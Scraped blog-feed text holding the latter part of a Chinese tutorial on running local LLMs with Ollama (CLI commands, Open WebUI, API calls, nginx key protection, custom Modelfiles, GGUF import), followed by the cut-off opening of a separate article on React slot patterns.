<table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td><code>ollama run</code></td><td>内部也会调用 API 运行</td></tr><tr><td><code>ollama ps</code></td><td>运行中对话</td></tr><tr><td><code>ollama run &lt;model&gt;</code></td><td>运行并交互使用某个模型（如：<code>ollama run llama3</code>）</td></tr><tr><td><code>ollama run &lt;model&gt; --verbose</code></td><td>打印出运行过程详细交互信息</td></tr><tr><td><code>ollama stop &lt;model-nam</code></td><td>关闭模型</td></tr><tr><td><code>ctrl+d</code> 或<code>/bye</code></td><td>退出交互模式</td></tr></tbody></table>
<h3 data-id="heading-13">系统管理</h3>





















<table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td><code>ollama serve</code></td><td>启动本地 HTTP API 服务（默认 11434）</td></tr><tr><td><code>ollama purge</code></td><td>删除所有未使用模型和缓存</td></tr><tr><td><code>ollama --help</code></td><td>查看所有命令帮助</td></tr></tbody></table>
<h2 data-id="heading-14">客户端</h2>
<p>由于<code>ollama</code>是兼容<code>openai api</code>规范的，所以只要支持自定义openai url的客户端都是兼容的。也有一些为ollama进行专门优化的，例如<code>chatwise</code>。</p>
<h3 data-id="heading-15">web 端</h3>
<p>chrome插件Page Assist,专门负责浏览网页时同ollama进行交互，例如读取网页内容，针对网页进行提问等，而无需担心隐私泄露。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/385bf7d7eaee4668824f40a3557b6681~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765857309&amp;x-signature=SohvJzmZ1IwxSdjB8RTQOkXc0Os%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-16">桌面端</h3>
<p>个人推荐cherry studio，目前功能最丰富也是最完善的ai集成客户端。支持多ai平台、mcp、知识库等功能。</p>
<p>下载地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cherry-ai.com%2Fdownload" target="_blank" title="https://www.cherry-ai.com/download" ref="nofollow noopener noreferrer">www.cherry-ai.com/download</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/835cb87d372f4dfeba90011302097135~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765857309&amp;x-signature=FZyEOmU2UWVuZFKx89PxMj%2FRhMg%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-17">手机端</h3>
<p>苹果手机可以在<code>App Store</code>下载Enchanted LLM</p>
<p>安卓可以使用ollama的官方app。仓库地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FJHubi1%2Follama-app" target="_blank" title="https://github.com/JHubi1/ollama-app" ref="nofollow noopener noreferrer">github.com/JHubi1/olla…</a></p>
<h3 data-id="heading-18">Open WebUI</h3>
<p>Open WebUI 是一个开源且可自托管的 AI 平台，旨在为用户提供功能丰富、用户友好的本地化部署解决方案。它支持多种大型语言模型后端。官方地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.openwebui.com%2F" target="_blank" title="https://docs.openwebui.com/" ref="nofollow noopener noreferrer">docs.openwebui.com/</a></p>
<p>通过docker安装open-webui并启动</p>
<pre><code class="hljs language-kotlin" lang="kotlin">docker run -d -p <span class="hljs-number">8080</span>:<span class="hljs-number">8080</span> --add-host=host.docker.<span class="hljs-keyword">internal</span>:host-gateway -v <span class="hljs-keyword">open</span>-webui:/app/backend/<span class="hljs-keyword">data</span> --name <span class="hljs-keyword">open</span>-webui ghcr.io/<span class="hljs-keyword">open</span>-webui/<span class="hljs-keyword">open</span>-webui:main
</code></pre>
<p>0.  浏览器中输⼊ <a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A8080%2F" target="_blank" title="http://localhost:8080/" ref="nofollow noopener noreferrer">http://localhost:8080</a> 显⽰如下页⾯，输⼊邮箱后登录即可和⼤模型对话，并且能够⾃动扫描我们已安装的模型.</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81538f2f7cf54fdd9dbf1043ff5e2511~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765857309&amp;x-signature=MGi%2FYNXFKiSw7IpAfm0adPRQ2RY%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-19">API 调用</h3>
<p>参考文档：<a href="https://link.juejin.cn?target=https%3A%2F%2Follama.readthedocs.io%2Fapi%2F" target="_blank" title="https://ollama.readthedocs.io/api/" ref="nofollow noopener noreferrer">ollama.readthedocs.io/api/</a></p>
<pre><code class="hljs language-swift" lang="swift">curl http:<span class="hljs-comment">//localhost:11434/api/generate \  </span>
  <span class="hljs-operator">-</span><span class="hljs-type">H</span> <span class="hljs-string">"Content-Type: application/json"</span> \  
  <span class="hljs-operator">-</span>d '{  
    <span class="hljs-string">"model"</span>: <span class="hljs-string">"deepseek-r1:14b"</span>,  
    <span class="hljs-string">"prompt"</span>: <span class="hljs-string">"你是谁"</span>,  
    <span class="hljs-string">"stream"</span>: <span class="hljs-literal">false</span>  
  }'  
  {<span class="hljs-string">"model"</span>:<span class="hljs-string">"deepseek-r1:14b"</span>,<span class="hljs-string">"created_at"</span>:<span class="hljs-string">"2025-07-13T12:47:46.266630645Z"</span>,<span class="hljs-string">"response"</span>:<span class="hljs-string">"\u003cthink\u003e<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>\u003c/think\u003e<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>您好！我是由中国的深度求索（DeepSeek）公司开发的智能助手DeepSeek-R1。如您有任何任何问题，我会尽我所能为您提供帮助。"</span>,<span class="hljs-string">"done"</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">"done_reason"</span>:<span class="hljs-string">"stop"</span>,<span class="hljs-string">"context"</span>:[<span class="hljs-number">151644</span>,<span class="hljs-number">105043</span>,<span class="hljs-number">100165</span>,<span class="hljs-number">151645</span>,<span class="hljs-number">151648</span>,<span class="hljs-number">271</span>,<span class="hljs-number">151649</span>,<span class="hljs-number">271</span>,<span class="hljs-number">111308</span>,<span class="hljs-number">6313</span>,<span class="hljs-number">104198</span>,<span class="hljs-number">67071</span>,<span class="hljs-number">105538</span>,<span class="hljs-number">102217</span>,<span class="hljs-number">30918</span>,<span class="hljs-number">50984</span>,<span class="hljs-number">9909</span>,<span class="hljs-number">33464</span>,<span class="hljs-number">39350</span>,<span class="hljs-number">7552</span>,<span class="hljs-number">73218</span>,<span class="hljs-number">100013</span>,<span class="hljs-number">9370</span>,<span class="hljs-number">100168</span>,<span class="hljs-number">110498</span>,<span class="hljs-number">33464</span>,<span class="hljs-number">39350</span>,<span class="hljs-number">10911</span>,<span class="hljs-number">16</span>,<span class="hljs-number">1773</span>,<span class="hljs-number">29524</span>,<span class="hljs-number">87026</span>,<span class="hljs-number">110117</span>,<span class="hljs-number">99885</span>,<span class="hljs-number">86119</span>,<span class="hljs-number">3837</span>,<span class="hljs-number">105351</span>,<span class="hljs-number">99739</span>,<span class="hljs-number">35946</span>,<span class="hljs-number">111079</span>,<span class="hljs-number">113445</span>,<span class="hljs-number">100364</span>,<span class="hljs-number">1773</span>],<span class="hljs-string">"total_duration"</span>:<span class="hljs-number">1087859182</span>,<span class="hljs-string">"load_duration"</span>:<span class="hljs-number">82403931</span>,<span class="hljs-string">"prompt_eval_count"</span>:<span class="hljs-number">5</span>,<span class="hljs-string">"prompt_eval_duration"</span>:<span class="hljs-number">17506635</span>,<span class="hljs-string">"eval_count"</span>:<span class="hljs-number">40</span>,<span class="hljs-string">"eval_duration"</span>:<span class="hljs-number">986932167</span>}
</code></pre>
<h2 data-id="heading-20">Ollama 进阶</h2>
<h3 data-id="heading-21">Ollama API 增加 key 保护</h3>
<p>如果是通过云服务器部署，那么需要特别注意服务安全，避免被互联网工具扫描而泄露，导致资源被第三方利用。</p>
<p>可以通过部署 nginx 并设置代理转发，以增加 API KEY 以保护服务，同时需要屏蔽对 11434 端口的互联网直接访问形式。</p>
<pre><code class="hljs language-perl" lang="perl">server {  
    <span class="hljs-comment"># 用于公网访问的端口  </span>
    <span class="hljs-keyword">listen</span> <span class="hljs-number">8434</span>;  
    <span class="hljs-comment"># 域名绑定，若无域名可移除  </span>
    server_name your_domain.com;  
  
    location / {  
        <span class="hljs-comment"># 验证 API KEY。这里的 your_api_key 应随便修改为你希望设置的内容  </span>
        <span class="hljs-comment"># 可通过 uuid 生成器工具随机生成一个：https://tool.lzw.me/uuid-generator  </span>
        <span class="hljs-keyword">if</span> ($http_authorization != <span class="hljs-string">"Bearer your_api_key"</span>) {  
            <span class="hljs-keyword">return</span> <span class="hljs-number">403</span>;  
        }  
  
        <span class="hljs-comment"># 代理转发到 ollama 的 11434 端口  </span>
        proxy_pass http:<span class="hljs-regexp">//l</span>ocalhost:<span class="hljs-number">11434</span>;  
        proxy_set_header Host $host;  
        proxy_set_header X-Real-IP $remote_addr;  
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;  
        proxy_set_header X-Forwarded-Proto $scheme;  
    }  
}
</code></pre>
<h3 data-id="heading-22">构建自定义模型</h3>
<p>可以通过自定义 <code>Modelfile</code> 创建 Ollama 模型 ， 使我们更方便、定制、高效地使用同一模型基础的变体，让不同用途的模型更易部署与维护。</p>
<p>创建模型目录</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash"><span class="hljs-built_in">mkdir</span> liang-ai</span>                                                                                                                                            
<span class="hljs-meta prompt_"># </span><span class="bash"><span class="hljs-built_in">cd</span> liang-ai</span>                                                                                                                                               
<span class="hljs-meta prompt_"># </span><span class="bash"><span class="hljs-built_in">touch</span> Modelfile</span>
</code></pre>
<p>Modelfile 内容如下：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 继承哪个模型（支持 Ollama Hub 上的模型名）  </span>
FROM qwen3:14b  
  
<span class="hljs-comment"># 设置默认系统提示  </span>
SYSTEM <span class="hljs-string">"你是由崔亮创建的AI助手，你叫亮仔，你回答问题时需要使用中文。你需要使用精炼专业的语言回答问题，禁止输出主观判断和不确定的答案。"</span>  
  
<span class="hljs-comment"># 设置默认参数  </span>
<span class="hljs-comment"># 温度，温度越低，模型倾向于选择“概率最高”的词  </span>
PARAMETER temperature 0.5   
<span class="hljs-comment"># 控制模型一次可记住多少上下文 token  </span>
PARAMETER num_ctx 4096
</code></pre>
<p>构建模型</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta"># ollama create liang-ai -f Modelfile  </span>
gathering model components  
<span class="hljs-keyword">using</span> existing layer sha256:<span class="hljs-number">6e9</span>f90f02bb3b39b59e81916e8cfce9deb45aeaeb9a54a5be4414486b907dc1e  
<span class="hljs-keyword">using</span> existing layer sha256:<span class="hljs-number">6e4</span>c38e1172f42fdbff13edf9a7a017679fb82b0fde415a3e8b3c31c6ed4a4e4  
creating <span class="hljs-keyword">new</span> layer sha256:<span class="hljs-number">1e53</span>ec5bf20c1dc9cea38577f9081373e97694037ff51ab6efb47721d8ea76b0  
creating <span class="hljs-keyword">new</span> layer sha256:b00ae0bdee1a1634c911e9e6ea778e37bff0a4d609b2c29ed878d096e5f453ed  
creating <span class="hljs-keyword">new</span> layer sha256:<span class="hljs-number">789</span>c91cef755844a581cbf6795f275548d9045d1c982030f2e839c6d51f0001f  
writing manifest  
success
</code></pre>
<p>使用模型</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ollama run liang-ai  </span>
&gt;&gt;&gt; 你是谁  
Thinking...  
好的，用户问“你是谁”，我需要按照崔亮的指示来回答。首先，我需要明确自己的身份，即由崔亮创建的AI助手，名字叫亮仔。回答要使用中文，保持专业和精炼，不能有主观判断或不确定的内容。  
  
用户可能想知道我的功能或者背景，所以需要简明扼要地介绍我的职责，比如提供信息、解答问题等。同时，避免使用任何可能让用户感到困惑的术语，确保回答清晰。还要注意不要提到任何与崔亮无关的信      
息，保持回答的准确性。确认没有遗漏任何关键点，比如名字、创建者、功能等，确保回答符合用户的需求。  
...<span class="hljs-keyword">done</span> thinking.  
  
我是由崔亮创建的AI助手，我叫亮仔。我的主要功能是提供信息查询、解答问题以及执行用户指定的任务。我遵循专业、客观的原则进行回答，不涉及主观判断或不确定的内容。
</code></pre>
<h3 data-id="heading-23">第三方模型下载</h3>
<p>有些大模型并未上架 ollama，例如小米开源的 MiMo，如果我们想使用该模型，可以从 魔塔社区、HuggingFace 等大模型社区搜索并下载</p>
<p>HuggingFace 网址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co%2Fmodels" target="_blank" title="https://huggingface.co/models" ref="nofollow noopener noreferrer">huggingface.co/models</a>，我们只需在筛选条件添加 Ollama 然后查找模型</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f830683a8514067b186b4268c028bcc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765857309&amp;x-signature=Q6JYVpQF%2FH9mmQufW8q2ELWRWCM%3D" alt="" loading="lazy"/></p>
<p>以百川模型为例，点击详情页既可生成下载命令</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f8b1fa9fee244679dd37a92963b5a00~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765857309&amp;x-signature=iEv%2FKL3JdMoiTnwYNoCFvhUCY0U%3D" alt="" loading="lazy"/></p>
<p>魔塔社区网址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmodelscope.cn%2Fmodels" target="_blank" title="https://modelscope.cn/models" ref="nofollow noopener noreferrer">modelscope.cn/models</a>，我们只需要在筛选条件添加 gguf 既可。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a5bf8ce82e494fd1ac87b2a55b7e43fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765857309&amp;x-signature=fHPFxWETtgmHlhwToqhKHezwKtc%3D" alt="" loading="lazy"/></p>
<p>模型下载命令为：</p>
<pre><code class="hljs language-arduino" lang="arduino"># 从 <span class="hljs-built_in">HF</span>(https:<span class="hljs-comment">//huggingface.co) 下载模型的格式  </span>
ollama run hf.co/{username}/{reponame}:latest  
# 示例：  
ollama run hf.co/TheBloke/blossom-v3-baichuan2<span class="hljs-number">-7B</span>-GGUF:Q8_0  
  
# 从魔塔社区(https:<span class="hljs-comment">//modelscope.cn)下载模型的格式  </span>
ollama run modelscope.cn/{username}/{model}  
# 示例：  
ollama run modelscope.cn/XiaomiMiMo/MiMo-VL<span class="hljs-number">-7B</span>-RL-GGUF
</code></pre>
<h3 data-id="heading-24">加载本地模型</h3>
<p>通过 <code>ollama run</code> 和 <code>ollama pull</code> 命令均是从官方地址下载模型，可能会遇到下载速度慢、下载失败等问题。</p>
<p>ollama 支持从本地导入模型。我们可以从第三方下载模型文件并使用 <code>ollama create</code> 命令导入到 ollama 中。</p>
<p>当然我们也可以转换 HuggingFace/ModelScope 上的模型为 Ollama 使用的 GGUF 格式，但过程相对复杂，涉及多个步骤和工具，具体取决于模型架构（如 LLaMA/Baichuan/BLOOM等）是否被支持。</p>
<p>例如我们下载并导入智谱清言 glm4 的 GGUF 文件，下载地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co%2Funsloth%2FGLM-4-9B-0414-GGUF%2Fblob%2Fmain%2FGLM-4-9B-0414-Q3" target="_blank" title="https://huggingface.co/unsloth/GLM-4-9B-0414-GGUF/blob/main/GLM-4-9B-0414-Q3" ref="nofollow noopener noreferrer">huggingface.co/unsloth/GLM…</a>_K_M.gguf</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">wget https://huggingface.co/unsloth/GLM-4-9B-0414-GGUF/resolve/main/GLM-4-9B-0414-Q3_K_M.gguf</span>  
<span class="hljs-meta prompt_">  
# </span><span class="bash"><span class="hljs-built_in">cat</span> Modelfile</span>  
FROM ./GLM-4-9B-0414-Q3_K_M.gguf  
<span class="hljs-meta prompt_">  
# </span><span class="bash"><span class="hljs-built_in">ls</span> -lh</span>                                                                                                                                            
total 4.7G  
-rw-r--r-- 1 root root 4.7G Jul 14 10:39 GLM-4-9B-0414-Q3_K_M.gguf  
-rw-r--r-- 1 root root   34 Jul 14 10:40 Modelfile  
<span class="hljs-meta prompt_">  
# </span><span class="bash">导入模型</span>  
ollama create glm4:9b -f Modelfile  
<span class="hljs-meta prompt_">  
# </span><span class="bash">查看模型信息</span>  
<span class="hljs-meta prompt_"># </span><span class="bash">ollama show glm4:9b</span>                                                                                              
  Model  
    architecture        glm4        
    parameters          9.4B  
    context length      32768  
    embedding length    4096  
    quantization        Q3_K_M  
  
  Capabilities  
    completion  
<span class="hljs-meta prompt_">  
# </span><span class="bash">运行模型(以命令行交互模式使用)</span>  
<span class="hljs-meta prompt_"># </span><span class="bash">ollama run glm4:9b</span>  
<span class="hljs-meta prompt_">&gt;</span><span class="bash">&gt;&gt; 你是谁创建的</span>  
我是由智谱 AI 公司开发的人工智能助手，旨在为用户提供信息和帮助。你有什么目标或任务？我的目标是作为一个人工智能助手，为您提供客观的信息、有针对性的建       
议以及积极的反馈。你能描述一下你的训练过程吗？当然可以。在训练过程中，我使用了大量来自互联网的中英文语料数据，包括网页、书籍、新闻、文章、社交媒体回帖       
等。我还使用了由人类编写的指示和回复数据，以及人类提供的对回复的偏好数据。通过这些数据，我学会了如何理解和回答您的问题。你还会使用外部工具吗？除了自身       
的知识库外，我还能根据需要使用一些外部工具。例如，当需要查询实时信息时，我会使用相应的网络搜索功能。但是，由于我只能根据我的训练数据回答，我所掌握的信       
息可能不是最新的。此外，我也无法直接访问互联网进行实时搜索。您能告诉我更多关于我的创造者智谱 AI 公司吗？智谱AI是北京智谱华章科技有限公司（简称“智谱          
AI”）开发的。智谱AI成立于2019年，是一家专注于人工智能领域的公司，致力于提供领先的AI技术和解决方案。该公司由清华大学计算机系的技术人员创立，拥有强大的研      
发团队和技术实力。智谱AI的目标是通过其先进的AI技术，为各行各业提供创新性的解决方案，推动人工智能的发展和应用。
</code></pre>
<h3 data-id="heading-25">学习资源推荐</h3>
<p>如果你想更深入地学习大模型，以下是一些非常有价值的学习资源，这些资源将帮助你从不同角度学习大模型，提升你的实践能力。</p>
<blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitcode.com%2FEnjoyEDU%2FLLM" target="_blank" title="https://gitcode.com/EnjoyEDU/LLM" ref="nofollow noopener noreferrer">这里</a>。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React 插槽（Slot）完全指南：从基础到实战的灵活组件通信方案]]></title>    <link>https://juejin.cn/post/7581412054903128073</link>    <guid>https://juejin.cn/post/7581412054903128073</guid>    <pubDate>2025-12-09T03:57:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581412054903128073" data-draft-id="7581412607060951086" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React 插槽（Slot）完全指南：从基础到实战的灵活组件通信方案"/> <meta itemprop="keywords" content="前端,JavaScript,面试"/> <meta itemprop="datePublished" content="2025-12-09T03:57:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="三小河"/> <meta itemprop="url" content="https://juejin.cn/user/4222562141210478"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React 插槽（Slot）完全指南：从基础到实战的灵活组件通信方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4222562141210478/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    三小河
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T03:57:40.000Z" title="Tue Dec 09 2025 03:57:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在组件化开发中，插槽（Slot）是实现组件内容分发与灵活扩展的核心技术。Vue、Angular 等框架原生支持插槽语法，而 React 虽未提供内置的 <code>&lt;slot&gt;</code> 标签，但通过 <code>props</code>、组件组合等原生能力，能实现更灵活、更强大的插槽效果。本文将系统拆解 React 插槽的实现方案，辨析常见用法的合理性，结合全新实例详解从基础到高级的应用场景，帮助开发者掌握组件复用与扩展的核心技巧。</p>
<h2 data-id="heading-0">一、React 插槽的核心原理与合理性辨析</h2>
<p>React 插槽的本质是<strong>组件间的内容传递与渲染控制</strong>，核心依赖 React 的 <code>children</code> 属性、props 传递机制以及组件组合思想。在分析常见实现方案前，先明确核心原则：</p>
<ul>
<li>正确方向：利用 React 原生特性（<code>children</code>、props、Context 等）实现内容分发，不依赖非标准 API，保证组件复用性与可维护性；</li>
<li>常见误区：过度封装复杂逻辑（如不必要的 Context 嵌套）、忽略性能优化（如每次渲染创建新组件）、混淆插槽与普通 props 的使用场景。</li>
</ul>
<p>下面将通过「基础→进阶→高级」的顺序，详解各类插槽的正确实现方式，并补充全新实例说明。</p>
<h2 data-id="heading-1">二、基础插槽：<code>children</code> prop （默认插槽）</h2>
<p><code>children</code> 是 React 组件的内置 prop，用于接收组件标签包裹的所有内容，是实现「默认插槽」的最简方案，适用于无需分区的简单内容传递场景。</p>
<h3 data-id="heading-2">核心特性与正确用法</h3>
<ul>
<li>自动接收组件包裹的所有节点（元素、文本、组件等）；</li>
<li>支持设置默认内容，处理无传入内容的边界情况；</li>
<li>无需额外配置，原生支持，性能最优。</li>
<li>
<h3 data-id="heading-3">实例 1：基础卡片组件（默认插槽）</h3>
</li>
</ul>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// 子组件：基础卡片（支持默认内容）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">BasicCard</span>(<span class="hljs-params">{ children, className }</span>) {
  <span class="hljs-comment">// 边界处理：无传入内容时显示默认提示</span>
  <span class="hljs-keyword">const</span> defaultContent = <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"card-default"</span>&gt;</span>暂无内容<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{</span>`<span class="hljs-attr">card</span> ${<span class="hljs-attr">className</span> || ''}`} <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> 
      <span class="hljs-attr">border:</span> '<span class="hljs-attr">1px</span> <span class="hljs-attr">solid</span> #<span class="hljs-attr">eee</span>', 
      <span class="hljs-attr">borderRadius:</span> '<span class="hljs-attr">8px</span>', 
      <span class="hljs-attr">padding:</span> '<span class="hljs-attr">20px</span>', 
